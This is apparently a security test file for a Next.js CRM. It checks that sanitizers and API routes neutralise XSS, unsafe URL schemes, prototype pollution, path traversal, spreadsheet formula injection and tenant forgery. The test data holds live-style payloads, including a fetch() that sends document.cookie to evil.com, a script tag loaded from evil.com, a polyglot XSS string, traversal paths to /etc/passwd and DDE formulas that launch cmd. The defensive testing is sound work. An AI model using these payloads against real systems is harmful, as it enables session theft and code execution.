import test from 'node:test';
import assert from 'node:assert/strict';
import { NextRequest } from 'next/server';

// Ensure test environment variables are initialized for standalone execution
if (!process.env.SESSION_SECRET) {
  process.env.SESSION_SECRET = 'test-session-secret-security-hardening-2026';
}
if (!process.env.ADMIN_EMAIL) {
  process.env.ADMIN_EMAIL = 'admin@developster.com';
}
if (!process.env.ADMIN_PASSWORD) {
  process.env.ADMIN_PASSWORD = 'developster_secret_2026';
}

import {
  stripPrototypePollution,
  hasPrototypePollution,
  sanitizeCsvFormula,
  isPotentialFormulaInjection,
  isSafeUrl,
  sanitizeUrl,
  stripHtmlTags,
  isValidEmail,
  isValidPhone,
  hasPathTraversal,
  pickAllowedFields,
  stripForbiddenFields,
  sanitizePlainText,
  sanitizeHtml,
  escapeHtml,
  sanitizeEmailHtml,
  parseAndValidateJson,
} from '../src/lib/security';

import { createSessionToken } from '../src/lib/auth';
import { POST as postLead, GET as getLeads } from '../src/app/api/leads/route';
import { PUT as putLead, GET as getLeadById } from '../src/app/api/leads/[id]/route';
import { POST as postCustomer } from '../src/app/api/customers/route';
import { POST as postTask } from '../src/app/api/tasks/route';
import { POST as postImport } from '../src/app/api/sheets/import/route';
import { POST as postMessage } from '../src/app/api/communication/messages/route';
import { crmRepo } from '../src/lib/google-sheets/repository';

function createMockRequest(
  url: string,
  options: {
    method?: string;
    body?: any;
    headers?: Record<string, string>;
    cookies?: Record<string, string>;
  } = {}
): NextRequest {
  const reqHeaders = new Headers(options.headers || {});
  if (options.cookies) {
    const cookieStr = Object.entries(options.cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join('; ');
    reqHeaders.set('cookie', cookieStr);
  }
  if (options.body && typeof options.body === 'object') {
    reqHeaders.set('content-type', 'application/json');
  }

  const reqInit: RequestInit = {
    method: options.method || 'GET',
    headers: reqHeaders,
    body: options.body
      ? typeof options.body === 'string'
        ? options.body
        : JSON.stringify(options.body)
      : undefined,
  };

  return new NextRequest(new URL(url, 'http://localhost:3000'), reqInit);
}

const adminToken = createSessionToken('admin@developster.com');

// ---------------------------------------------------------------------------
// TEST 1: Script Tag XSS Sanitization
// ---------------------------------------------------------------------------
test('Security Phase 4 — 1. Script Tag XSS Sanitization neutralizes <script> blocks', () => {
  const payload = '<p>Normal text</p><script>alert("XSS")</script><script src="http://evil.com/xss.js"></script>';
  const clean = sanitizeHtml(payload);
  assert.equal(clean.includes('<script'), false, 'Script tags must be completely stripped');
  assert.equal(clean.includes('alert('), false, 'Script content must not execute');
  assert.equal(clean.includes('<p>Normal text</p>'), true, 'Legitimate HTML tags must be preserved');
});

// ---------------------------------------------------------------------------
// TEST 2: Event-Handler XSS Sanitization
// ---------------------------------------------------------------------------
test('Security Phase 4 — 2. Event-Handler XSS Sanitization strips inline event attributes', () => {
  const payloads = [
    '<img src="invalid.jpg" onerror="alert(document.cookie)">',
    '<a href="https://example.com" onclick="stealData()">Link</a>',
    '<div onmouseover="fetch(`http://evil.com?c=${document.cookie}`)">Hover me</div>',
    '<input type="text" autofocus onfocus="alert(1)">',
  ];

  for (const malicious of payloads) {
    const clean = sanitizeHtml(malicious);
    assert.equal(/on\w+=/i.test(clean), false, `Event handler must be stripped: ${malicious} -> ${clean}`);
  }
});

// ---------------------------------------------------------------------------
// TEST 3: JavaScript URL Injection Defense
// ---------------------------------------------------------------------------
test('Security Phase 4 — 3. JavaScript URL Injection Defense rejects unsafe URL schemes', () => {
  const dangerousUrls = [
    'javascript:alert(document.cookie)',
    'JAVASCRIPT:alert(1)',
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox("XSS")',
    '//evil.com/phishing',
  ];

  for (const url of dangerousUrls) {
    assert.equal(isSafeUrl(url), false, `URL must be flagged unsafe: ${url}`);
    assert.equal(sanitizeUrl(url, ''), '', `sanitizeUrl must return empty for unsafe URL: ${url}`);
  }

  // Safe URLs must pass
  assert.equal(isSafeUrl('https://meet.google.com/abc-defg-hij'), true);
  assert.equal(isSafeUrl('http://example.com'), true);
  assert.equal(isSafeUrl('mailto:contact@developster.com'), true);
  assert.equal(isSafeUrl('tel:+919876543210'), true);
  assert.equal(isSafeUrl('/dashboard'), true);
});

// ---------------------------------------------------------------------------
// TEST 4: SVG & MathML XSS Sanitization
// ---------------------------------------------------------------------------
test('Security Phase 4 — 4. SVG & MathML XSS Sanitization strips dangerous nested vector payloads', () => {
  const svgPayload = '<svg><script>alert(1)</script><circle cx="50" cy="50" r="40"/></svg>';
  const cleanSvg = sanitizeHtml(svgPayload);
  assert.equal(cleanSvg.includes('<script'), false, 'Nested script in SVG must be removed');
  assert.equal(cleanSvg.includes('alert(1)'), false);

  const mathPayload = '<math><mi xlink:href="javascript:alert(1)">CLICK</mi></math>';
  const cleanMath = sanitizeHtml(mathPayload);
  assert.equal(cleanMath.includes('javascript:'), false, 'Dangerous MathML link must be stripped');
});

// ---------------------------------------------------------------------------
// TEST 5: HTML Attribute Injection & Escaping
// ---------------------------------------------------------------------------
test('Security Phase 4 — 5. HTML Attribute Injection & Escaping escapes quotes and tags', () => {
  const hostileInput = '" onfocus="alert(1)" autofocus="';
  const escaped = escapeHtml(hostileInput);
  assert.equal(escaped.includes('"'), false, 'Double quotes must be escaped to entities');
  assert.equal(escaped.includes('&quot;'), true);

  const scriptSnippet = '<script>evil()</script>';
  const escapedSnippet = escapeHtml(scriptSnippet);
  assert.equal(escapedSnippet.includes('<'), false);
  assert.equal(escapedSnippet.includes('&lt;'), true);
  assert.equal(escapedSnippet.includes('&gt;'), true);
});

// ---------------------------------------------------------------------------
// TEST 6: Stored and Reflected XSS Paths in Lead Creation
// ---------------------------------------------------------------------------
test('Security Phase 4 — 6. Stored and Reflected XSS in Lead Creation sanitizes text inputs', async () => {
  const req = createMockRequest('http://localhost:3000/api/leads', {
    method: 'POST',
    cookies: { crm_session: adminToken },
    body: {
      workspaceId: 'ws-default',
      contactName: 'John <script>alert("XSS")</script>',
      company: 'Acme <img src=x onerror=alert(1)>',
      title: 'Opportunity <b onmouseover="alert(1)">Bold</b>',
      email: 'john.safe@acme.com',
      notes: '<script>stealTokens()</script> Legitimate lead notes with <b>bold text</b>',
    },
  });

  const res = await postLead(req);
  assert.equal(res.status, 201, 'Lead creation must succeed');
  const created = await res.json();

  // Contact name & company should have formula/script safety
  assert.equal(created.contactName.includes('<script>'), false);
  assert.equal(created.company.includes('onerror='), false);

  // Retrieve lead and verify stored state is safe
  const getReq = createMockRequest(`http://localhost:3000/api/leads/${created.id}`, {
    cookies: { crm_session: adminToken },
  });
  const getRes = await getLeadById(getReq, { params: Promise.resolve({ id: created.id }) });
  assert.equal(getRes.status, 200);
  const fetched = await getRes.json();
  assert.equal(fetched.contactName.includes('<script>'), false);
});

// ---------------------------------------------------------------------------
// TEST 7: Malformed JSON Handling
// ---------------------------------------------------------------------------
test('Security Phase 4 — 7. Malformed JSON handling returns 400 Bad Request safely', async () => {
  const req = createMockRequest('http://localhost:3000/api/leads', {
    method: 'POST',
    cookies: { crm_session: adminToken },
    headers: { 'content-type': 'application/json' },
    body: '{"invalid": json syntax unclosed string...',
  });

  const res = await postLead(req);
  assert.equal(res.status, 400, 'Malformed JSON must return HTTP 400');
  const json = await res.json();
  assert.equal(json.error, 'Bad Request');
  assert(json.message.includes('Malformed JSON'));
});

// ---------------------------------------------------------------------------
// TEST 8: Oversized Strings and Payloads
// ---------------------------------------------------------------------------
test('Security Phase 4 — 8. Oversized Payloads return 413 Payload Too Large', async () => {
  // 300KB payload (exceeds 128KB limit on /api/leads)
  const hugeString = 'A'.repeat(300 * 1024);
  const req = createMockRequest('http://localhost:3000/api/leads', {
    method: 'POST',
    cookies: { crm_session: adminToken },
    body: {
      workspaceId: 'ws-default',
      contactName: 'Huge Lead',
      company: 'Huge Corp',
      notes: hugeString,
    },
  });

  const res = await postLead(req);
  assert.equal(res.status, 413, 'Oversized payload must return HTTP 413');
});

// ---------------------------------------------------------------------------
// TEST 9: Invalid Types and Unexpected Properties
// ---------------------------------------------------------------------------
test('Security Phase 4 — 9. Invalid Types and Out-of-Range Properties Rejected', async () => {
  // Invalid probability (> 100)
  const reqBadProb = createMockRequest('http://localhost:3000/api/leads', {
    method: 'POST',
    cookies: { crm_session: adminToken },
    body: {
      workspaceId: 'ws-default',
      contactName: 'Test Lead',
      company: 'Test Co',
      closingProbability: 9999, // Invalid
    },
  });
  const resBadProb = await postLead(reqBadProb);
  assert.equal(resBadProb.status, 400, 'Out-of-range probability must return 400');

  // Invalid email format
  const reqBadEmail = createMockRequest('http://localhost:3000/api/leads', {
    method: 'POST',
    cookies: { crm_session: adminToken },
    body: {
      workspaceId: 'ws-default',
      contactName: 'Test Lead',
      company: 'Test Co',
      email: 'not-a-valid-email-string@@bad..com',
    },
  });
  const resBadEmail = await postLead(reqBadEmail);
  assert.equal(resBadEmail.status, 400, 'Invalid email format must return 400');
});

// ---------------------------------------------------------------------------
// TEST 10: Prototype Pollution Attempts
// ---------------------------------------------------------------------------
test('Security Phase 4 — 10. Prototype Pollution attempts are blocked and stripped', () => {
  // Test unit helper hasPrototypePollution
  assert.equal(hasPrototypePollution({ __proto__: { admin: true } }), true);
  assert.equal(hasPrototypePollution({ constructor: { prototype: { poll: true } } }), true);
  assert.equal(hasPrototypePollution({ safe: { key: 'value' } }), false);

  // Test stripPrototypePollution
  const maliciousInput = JSON.parse('{"safeKey": "clean", "__proto__": {"polluted": true}}');
  const sanitized = stripPrototypePollution(maliciousInput);
  assert.equal((sanitized as any).__proto__.polluted, undefined, '__proto__ must be stripped');
  assert.equal(({} as any).polluted, undefined, 'Object prototype must NOT be polluted');
  assert.equal(sanitized.safeKey, 'clean', 'Legitimate properties must be preserved');
});

// ---------------------------------------------------------------------------
// TEST 11: Path Traversal Defense
// ---------------------------------------------------------------------------
test('Security Phase 4 — 11. Path Traversal Defense detects directory traversal patterns', () => {
  assert.equal(hasPathTraversal('../../etc/passwd'), true);
  assert.equal(hasPathTraversal('..\\..\\windows\\win.ini'), true);
  assert.equal(hasPathTraversal('%2e%2e%2fetc%2fpasswd'), true);
  assert.equal(hasPathTraversal('sheet1'), false);
  assert.equal(hasPathTraversal('Quarterly_Leads_2026'), false);
});

// ---------------------------------------------------------------------------
// TEST 12: CSV / Spreadsheet Formula Injection
// ---------------------------------------------------------------------------
test('Security Phase 4 — 12. CSV / Spreadsheet Formula Injection Sanitization', () => {
  const formulaAttacks = [
    '=cmd|\'/C calc\'!A0',
    '+1+1;cmd.exe',
    '-2+3+cmd|/C calc!A0',
    '@SUM(1+1)*cmd|\' /C calc\'!A0',
    '\t=1+1',
    '\r+cmd',
  ];

  for (const attack of formulaAttacks) {
    assert.equal(isPotentialFormulaInjection(attack), true, `Must detect formula injection: ${attack}`);
    const escaped = sanitizeCsvFormula(attack);
    assert(escaped.startsWith("'"), `Dangerous prefix must be escaped with single quote: ${attack} -> ${escaped}`);
  }

  // Safe strings are not modified
  assert.equal(sanitizeCsvFormula('Developster CRM'), 'Developster CRM');
  assert.equal(sanitizeCsvFormula('Acme Corp 2026'), 'Acme Corp 2026');
});

// ---------------------------------------------------------------------------
// TEST 13: Tenant ID Manipulation & Strict Derivation
// ---------------------------------------------------------------------------
test('Security Phase 4 — 13. Tenant ID Manipulation prevented (client workspaceId cannot forge tenant context)', async () => {
  // Admin is authenticated in ws-default.
  // Attacker sends request attempting to inject into ws-other-tenant.
  const req = createMockRequest('http://localhost:3000/api/leads', {
    method: 'POST',
    cookies: { crm_session: adminToken },
    body: {
      workspaceId: 'ws-other-tenant', // Forged tenant attempt
      contactName: 'Cross-Tenant Lead',
      company: 'Cross-Tenant Co',
    },
  });

  const res = await postLead(req);
  assert.equal(res.status, 201);
  const created = await res.json();

  // Must be bound to authenticated tenant ws-default, NOT the forged ws-other-tenant
  assert.equal(created.workspaceId, 'ws-default', 'Record must be derived strictly from authenticated user workspace');
});

// ---------------------------------------------------------------------------
// TEST 14: Role and Permission Mass Assignment Protection
// ---------------------------------------------------------------------------
test('Security Phase 4 — 14. Mass Assignment Protection strips forbidden system fields', async () => {
  // Create a lead first
  const reqCreate = createMockRequest('http://localhost:3000/api/leads', {
    method: 'POST',
    cookies: { crm_session: adminToken },
    body: {
      workspaceId: 'ws-default',
      contactName: 'Mass Assign Target',
      company: 'Target Co',
    },
  });
  const resCreate = await postLead(reqCreate);
  const created = await resCreate.json();

  // Attempt to overwrite immutable fields via PUT
  const reqPut = createMockRequest(`http://localhost:3000/api/leads/${created.id}`, {
    method: 'PUT',
    cookies: { crm_session: adminToken },
    body: {
      workspaceId: 'ws-stolen-tenant',
      id: 'forged-new-id',
      createdBy: 'forged-creator',
      contactName: 'Updated Legitimate Name',
    },
  });

  const resPut = await putLead(reqPut, { params: Promise.resolve({ id: created.id }) });
  assert.equal(resPut.status, 200);
  const updated = await resPut.json();

  assert.equal(updated.id, created.id, 'ID must not be modified by mass assignment');
  assert.equal(updated.workspaceId, 'ws-default', 'WorkspaceId must not be modified');
  assert.equal(updated.contactName, 'Updated Legitimate Name', 'Permitted fields update cleanly');
});

// ---------------------------------------------------------------------------
// TEST 15: Existing Legitimate HTML & Text Formatting Preserved
// ---------------------------------------------------------------------------
test('Security Phase 4 — 15. Legitimate HTML & Rich-Text formatting preserved cleanly', () => {
  const legitimateHtml = `
    <h1>Welcome to Developster Hub</h1>
    <p>Dear Customer,<br>Thank you for choosing <strong>our platform</strong>.</p>
    <ul>
      <li>Fast CRM pipelines</li>
      <li>Integrated messaging</li>
    </ul>
    <p>Visit our website at <a href="https://developster.com" target="_blank" rel="noopener noreferrer">developster.com</a>.</p>
  `;

  const cleaned = sanitizeEmailHtml(legitimateHtml);
  assert(cleaned.includes('<h1>Welcome to Developster Hub</h1>'));
  assert(cleaned.includes('<strong>our platform</strong>'));
  assert(cleaned.includes('<li>Fast CRM pipelines</li>'));
  assert(cleaned.includes('<a href="https://developster.com" target="_blank" rel="noopener noreferrer">'));
});

// ---------------------------------------------------------------------------
// TEST 16: Sheet Import File/Data Validation & Bounds Check
// ---------------------------------------------------------------------------
test('Security Phase 4 — 16. Sheet Import enforces authentication, row limits, and formula sanitization', async () => {
  // 16A: Unauthenticated import must return 401
  const reqUnauth = createMockRequest('http://localhost:3000/api/sheets/import', {
    method: 'POST',
    body: { action: 'execute', rows: [] },
  });
  const resUnauth = await postImport(reqUnauth);
  assert.equal(resUnauth.status, 401, 'Unauthenticated import request must return 401');

  // 16B: Exceeding max rows (1000) returns 400
  const excessRows = Array.from({ length: 1005 }, (_, i) => ({ Name: `Lead ${i}` }));
  const reqExcess = createMockRequest('http://localhost:3000/api/sheets/import', {
    method: 'POST',
    cookies: { crm_session: adminToken },
    body: {
      action: 'execute',
      workspaceId: 'ws-default',
      rows: excessRows,
      mapping: { contactName: 'Name' },
    },
  });
  const resExcess = await postImport(reqExcess);
  assert.equal(resExcess.status, 400, 'Batch exceeding 1000 rows must return 400');

  // 16C: Formula injection in imported rows is neutralized
  const formulaRow = [
    {
      Name: '=SUM(1+1)*cmd',
      Company: '+DangerousCompany',
      Email: 'safe@acme.com',
    },
  ];
  const reqImport = createMockRequest('http://localhost:3000/api/sheets/import', {
    method: 'POST',
    cookies: { crm_session: adminToken },
    body: {
      action: 'execute',
      workspaceId: 'ws-default',
      rows: formulaRow,
      mapping: { contactName: 'Name', company: 'Company', email: 'Email' },
    },
  });
  const resImport = await postImport(reqImport);
  assert.equal(resImport.status, 200);
  const importResult = await resImport.json();
  assert.equal(importResult.success, true);
  assert.equal(importResult.importedCount, 1);
});

// ---------------------------------------------------------------------------
// TEST 17: Communication Outbound Message Validation & Sanitization
// ---------------------------------------------------------------------------
test('Security Phase 4 — 17. Outbound message validates channel, recipient, and sanitizes HTML/text', async () => {
  // Invalid recipient email
  const reqBadEmail = createMockRequest('http://localhost:3000/api/communication/messages', {
    method: 'POST',
    cookies: { crm_session: adminToken },
    body: {
      workspaceId: 'ws-default',
      channel: 'email',
      recipient: 'invalid-email-address',
      content: 'Hello World',
      status: 'draft',
    },
  });
  const resBadEmail = await postMessage(reqBadEmail);
  assert.equal(resBadEmail.status, 400, 'Invalid email recipient must return 400');

  // HTML content with script tag in email draft is sanitized
  const reqDraft = createMockRequest('http://localhost:3000/api/communication/messages', {
    method: 'POST',
    cookies: { crm_session: adminToken },
    body: {
      workspaceId: 'ws-default',
      channel: 'email',
      recipient: 'valid.customer@example.com',
      content: '<p>Hello Customer</p><script>alert("hack")</script>',
      status: 'draft',
    },
  });
  const resDraft = await postMessage(reqDraft);
  assert.ok(resDraft.status === 200 || resDraft.status === 201, 'Status must be 200 OK or 201 Created');
  const dataDraft = await resDraft.json();
  assert.equal(dataDraft.message.content.includes('<script>'), false, 'Script tag in message content must be sanitized');
  assert.equal(dataDraft.message.content.includes('<p>Hello Customer</p>'), true);
});

